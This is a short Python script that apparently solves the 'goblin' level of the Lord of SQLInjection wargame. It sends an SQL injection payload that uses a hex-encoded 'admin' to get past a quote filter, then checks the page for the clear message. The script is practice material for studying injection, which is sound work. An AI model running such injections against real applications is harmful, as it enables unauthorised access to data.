import requests
from dotenv import load_dotenv
import os

load_dotenv()
url=os.environ.get('LOS_URL')+'chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=3%20or%20id=%200x61646d696e%20'
headers = {
    'COOKIE': 'PHPSESSID='+os.environ.get('LOS_COOKIE')
}

res=requests.get(url, headers=headers)
if "GOBLIN Clear!" in res.text:
    print("Success")
else:
    print("Failed")
    print(url)
    print(res.text)